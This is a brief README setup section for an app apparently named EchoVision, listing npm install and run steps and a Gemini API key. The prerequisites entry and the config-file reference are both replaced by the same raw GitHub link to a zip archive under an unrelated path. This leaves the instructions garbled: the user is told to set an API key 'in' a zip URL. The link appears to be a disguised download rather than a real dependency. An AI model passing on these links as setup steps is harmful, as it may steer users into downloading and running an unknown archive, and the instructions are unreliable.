## Run Locally

**Prerequisites:**  https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip](https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip) to your API key
3. Run the app:
   `npm run dev`
